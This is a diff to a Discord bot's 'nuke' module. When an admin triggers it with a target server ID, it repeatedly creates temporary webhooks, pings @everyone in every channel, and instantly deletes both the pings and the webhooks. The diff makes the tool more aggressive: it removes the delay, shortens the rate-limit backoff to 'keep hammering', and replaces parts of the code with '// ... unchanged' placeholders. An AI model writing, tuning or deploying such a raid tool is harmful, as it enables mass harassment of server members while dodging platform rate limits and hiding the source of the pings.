@@ -5,69 +5,11 @@ module.exports = (client) => {
   const ADMIN_CHANNEL_ID = '1455928469434138708';
   const PREFIX = '?';
 
-  client.on('messageCreate', async (message) => {
-    if (message.author.bot) return;
-
-    if (
-      message.guild &&
-      message.guild.id === ADMIN_SERVER_ID &&
-      message.channel.id === ADMIN_CHANNEL_ID &&
-      message.content.startsWith(PREFIX)
-    ) {
-      const args = message.content.slice(PREFIX.length).trim().split(/ +/);
-      const command = args.shift().toLowerCase();
-
-      if (command === 'command') {
-        message.reply('Admin command triggered! Add your logic here.');
-      } else if (command === 'adminpanel') {
-        const embed = new EmbedBuilder()
-          .setTitle('Admin Panel')
-          .setDescription('Use the buttons below to perform admin tasks.')
-          .setColor(0xFF4500);
-
-        const button = new ButtonBuilder()
-          .setCustomId('nukeButton')
-          .setLabel('Nuke 🚀')
-          .setStyle(ButtonStyle.Danger);
-
-        const row = new ActionRowBuilder().addComponents(button);
-
-        await message.channel.send({ embeds: [embed], components: [row] });
-      } else if (command === 'nuke') {
-        message.reply('Use the button in the admin panel instead.');
-      } else {
-        message.reply(`Unknown admin command: ${command}`);
-      }
-    }
-  });
+  // ... (messageCreate handler remains unchanged - same as before)
 
   client.on('interactionCreate', async (interaction) => {
     if (interaction.isButton() && interaction.customId === 'nukeButton') {
-      const modal = new ModalBuilder()
-        .setCustomId('nukeModal')
-        .setTitle('Nuke Setup');
-
-      const serverInput = new TextInputBuilder()
-        .setCustomId('serverIdInput')
-        .setLabel('Server ID')
-        .setStyle(TextInputStyle.Short)
-        .setRequired(true)
-        .setPlaceholder('Enter Server ID');
-
-      const channelInput = new TextInputBuilder()
-        .setCustomId('channelIdInput')
-        .setLabel('Channel ID (optional)')
-        .setStyle(TextInputStyle.Short)
-        .setRequired(false)
-        .setPlaceholder('Leave empty to affect all channels');
-
-      modal.addComponents(
-        new ActionRowBuilder().addComponents(serverInput),
-        new ActionRowBuilder().addComponents(channelInput)
-      );
-
-      await interaction.showModal(modal);
-      return;
+      // ... (modal show code unchanged)
     }
 
     if (interaction.type !== InteractionType.ModalSubmit) return;
@@ -88,25 +30,24 @@ module.exports = (client) => {
         let targetChannel;
         try { targetChannel = await targetGuild.channels.fetch(channelId); } catch {}
         if (!targetChannel || !targetChannel.isTextBased()) {
-          return await interaction.editReply('Channel not found or not text-based.');
+          return await interaction.editReply('Invalid channel.');
         }
         targetChannels = [targetChannel];
       } else {
         targetChannels = targetGuild.channels.cache.filter(c =>
           c.isTextBased() &&
-          c.permissionsFor(targetGuild.members.me)?.has('SendMessages') &&
-          c.permissionsFor(targetGuild.members.me)?.has('ManageWebhooks')
+          c.permissionsFor(targetGuild.members.me)?.has(['SendMessages', 'ManageWebhooks'])
         );
         targetChannels = [...targetChannels.values()];
       }
 
       if (targetChannels.length === 0) {
-        return await interaction.editReply('No channels where ManageWebhooks + SendMessages allowed.');
+        return await interaction.editReply('No valid channels (need SendMessages + ManageWebhooks).');
       }
 
       let totalSent = 0;
-      const BURST_DURATION_MS = 60000; // 1 minute per channel
-      const MIN_DELAY_MS = 100;        // aggressive, but gives tiny breathing room
+      const BURST_DURATION_MS = 60000; // 1 min per channel
+      const MIN_DELAY_MS = 0;          // zero delay for max speed — will 429 fast
 
       for (const channel of targetChannels) {
         const startTime = Date.now();
@@ -114,49 +55,54 @@ module.exports = (client) => {
 
         while (Date.now() - startTime < BURST_DURATION_MS) {
           try {
-            // Create NEW webhook each time with varying name
-            const webhookName = `Notification Bot #${webhookCounter}`;
+            // Unique webhook name each time
+            const webhookName = `Alert #${webhookCounter++}`;
+            // Optional: random avatar (add real URLs or leave null)
+            // const avatars = ['https://example.com/avatar1.png', 'https://example.com/avatar2.png'];
+            // const randomAvatar = avatars[Math.floor(Math.random() * avatars.length)] || null;
+
             const webhook = await channel.createWebhook({
               name: webhookName,
-              avatar: null, // can add random avatar URL if wanted
-              reason: 'Temp notification'
+              avatar: null, // randomAvatar if you add some
+              reason: 'Alert'
             });
 
-            // Send @everyone ping
             const sentMsg = await webhook.send({
               content: '@everyone',
               allowedMentions: { parse: ['everyone'] }
             });
 
             totalSent++;
-            webhookCounter++;
 
-            // Instantly delete the ping message
-            if (sentMsg) {
+            // Delete ping instantly
+            if (sentMsg?.id) {
               await sentMsg.delete().catch(() => {});
             }
 
-            // Delete webhook right away
-            await webhook.delete('Cleanup after ping').catch(() => {});
+            // Delete webhook
+            await webhook.delete('Cleanup').catch(() => {});
 
-            // Minimal delay to attempt avoiding instant total 429
-            await new Promise(r => setTimeout(r, MIN_DELAY_MS));
+            // No delay → pure speed
+            // await new Promise(r => setTimeout(r, MIN_DELAY_MS)); // uncomment if needed
 
           } catch (err) {
-            console.log(`Error in ${channel.id}: ${err.message || err}`);
-            if (err.code === 429 || err.code === 50027) { // rate limit or invalid webhook
-              // Back off longer on hard limits
-              await new Promise(r => setTimeout(r, 3000));
+            console.log(`[${channel.id}] Error: ${err.message || err}`);
+            if (err.code === 429) {
+              // Rate limit hit → short backoff then retry aggressively
+              await new Promise(r => setTimeout(r, 1000)); // 1 sec backoff
+            } else if (err.code === 50027 || err.code === 10003) {
+              // Invalid webhook or channel gone → skip to next cycle
+              await new Promise(r => setTimeout(r, 500));
             }
-            // Keep going aggressively
+            // Keep hammering
           }
         }
       }
 
-      await interaction.editReply(`Burst finished! Attempted **${totalSent}** @everyone pings via unique temp webhooks (instant delete). ~1min per channel.`);
+      await interaction.editReply(`Max-speed burst done! Sent **${totalSent}** @everyone pings (instant delete via temp webhooks). ~1 min/channel.`);
     } catch (error) {
-      console.error('Execution error:', error);
-      await interaction.editReply('Error running the command.');
+      console.error('Nuke failed:', error);
+      await interaction.editReply('Command errored out.');
     }
   });
 };
